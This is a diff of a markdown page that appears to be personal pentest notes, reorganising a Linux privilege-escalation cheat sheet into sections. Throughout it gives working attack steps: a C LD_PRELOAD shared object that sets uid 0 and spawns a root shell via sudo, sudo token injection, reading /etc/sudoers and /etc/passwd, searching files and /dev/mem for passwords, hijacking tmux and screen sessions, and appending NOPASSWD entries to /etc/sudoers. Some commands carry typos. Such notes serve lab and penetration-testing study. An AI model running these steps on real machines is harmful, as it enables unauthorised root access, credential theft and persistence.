@@ -4,20 +4,22 @@
 <mark style="color:blue;">Manual checks can help</mark> <mark style="color:blue;">**understand way more how attacks work**</mark><mark style="color:blue;">. Check this out !</mark>
 {% endhint %}
 
-## Walkthrough (Kinda)
+## Walkthrough
+
+### SUDO
 
 ```bash
-'''
-SUDO
-'''
-sudo -l
-sudo su
 # check sudo version for exploits
 sudo -V | grep “Sudo ver”
 
+# check rights
+sudo -l
+# gtfobins !
+
 # sudo LD_PRELOAD
 Defaults        env_keep += LD_PRELOAD
-# COMPILE :
+
+# COMPILE /tmp/exploit.c :
 
 #include <stdio.h>
 #include <sys/types.h>
@@ -29,26 +31,33 @@ void _init() {
 	setuid(0);
 	system("/bin/sh");
 }
+
 # with :
+
 gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 
 # Execute any binary with the LD_PRELOAD to spawn a shell : 
+
 sudo LD_PRELOAD=<full_path_to_so_file> <program>
 sudo LD_PRELOAD=/tmp/shell.so find
 
 # sudo_inject | https://github.com/nongiach/sudo_inject
+
 # requirements : 
 #    Ptrace fully enabled (/proc/sys/kernel/yama/ptrace_scope == 0).
 #    Current user must have living process that has a valid sudo token with the same uid.
+
 sudo whatever
 sh exploit.sh
+
 # wait
 sudo -i
 # root !
+```
 
-'''
-USER INFOS
-'''
+### User infos
+
+```bash
 id
 wwhoami
 w
@@ -56,17 +65,20 @@ last
 cat /etc/passwd
 cat /etc/sudoers
 cat /etc/group
+```
 
-'''
-KERNEL
-'''
+### Kernel version
+
+```bash
 uname -a 
 lsb_release -a
 cat /proc/version /etc/issue /etc/*-release
+# check for cves
+```
 
-'''
-FILES/BINARIES & PASSWORDS
-'''
+### Files, binaries and passwords
+
+```bash
 ls -la ~/ 
 ls -la /var/mail /home/*/ /var/spool/mail /home/*/.bash_history /var
 
@@ -80,10 +92,11 @@ ls -la /root/.bashrc
 ls -la /home/*/.bashrc
 locate .bashrc
 find / -name .bashrc -xdev 2>/dev/null
+```
 
-'''
-PROCESSES / PORTS
-'''
+### Processes and ports
+
+```bash
 # something is running that we can exploit ?
 ps aux | grep root
 
@@ -96,10 +109,11 @@ cat /etc/bashrc
 cat ~/.bash_profile
 cat ~/.bashrc
 cat ~/.bash_logout
+```
 
-'''
-CRONJOBS
-'''
+### CronTabs & Scheduled jobs
+
+```bash
 # check for cronjobs
 crontab -l 
 ls -alh /var/spool/cron
@@ -115,43 +129,50 @@ cat /var/spool/cron/crontabs/root
 
 # PSPY to to see commands run by other users, cron jobs, etc. in real time
 ./pspy > pspy-out.txt
+```
 
-'''
-FILE SYSTEMS
-'''
+### File systems
+
+```bash
 # unmounted file-systems ?
 cat /etc/fstab
 
 # If NFS is open, check if the target has any open NFS shares, if it does, then mount it to your filesystem
 showmount -e X.X.X.X
-mount X.X.X.X:/ /tmp/
+mount X.X.X.X:/ /tmp/mount1
+```
 
-'''
-APPS
-'''
+### Applications
+
+```bash
 # check installed apps + versions + running ?
 ls -alh /usr/bin/ /sbin/ /var/cache/apt/archives /var/cache/yum/
 dpkg -l
 rpm -qa
 # Any useful applications installed? 
 which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp tmux screen nmap 2>/dev/null
+```
 
-'''
-SESSIONS
-'''
+### Sessions
+
+```bash
 # can we hijack any shell sessions ?
 tmux ls
 tmux attach -t tmuxname 
 screen -ls
 screen-dr sessionname
 byobu list-session
+```
 
-'''
-MEMORY
-'''
+### Memory
+
+```bash
 # some services can save clear-text creds in memory
 ps aux # grab the process id
 gdb -p SERVICE; gdb PROCID
+
+# in memory passwords
+strings /dev/mem -n10 | grep -i PASS
 ```
 
 ### Files permissions
@@ -164,9 +185,6 @@ gdb -p SERVICE; gdb PROCID
 # Files containing passwords
 grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
 find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
-
-# in memory passwords
-strings /dev/mem -n10 | grep -i PASS
 
 # ssh
 find / -name authorized_keys 2> /dev/null
@@ -189,19 +207,30 @@ echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers
 echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
 echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
 
-
 # World executable folder
 find / -perm -o x -type d 2>/dev/null
 
 # World writable and executable folders
 find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
+```
 
-# SUID
+### SUID / SGID / GUID 
+
+```bash
+# SUID / SGID
+find / -perm -u=s -type f 2>/dev/null | xargs ls -l
 find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
-find / -uid 0 -perm -4000 -type f 2>/dev/null
+find / -uid 0 -perm -4000 -type f 2>/dev/null 
+find / -perm -g=s -type f 2>/dev/null | xargs ls -l
+find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
 
-# last edited files (last 10min)
-find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
+# Look for any binaries that seem odd. Any binaries running from a users home directory?
+# Check the version of any odd binaries and see if there are any public exploits that can be used to gain root
+
+# SUID PATH
+echo $PATH
+env | grep PATH
+print $PATH
 ```
 
 ### Capabilities
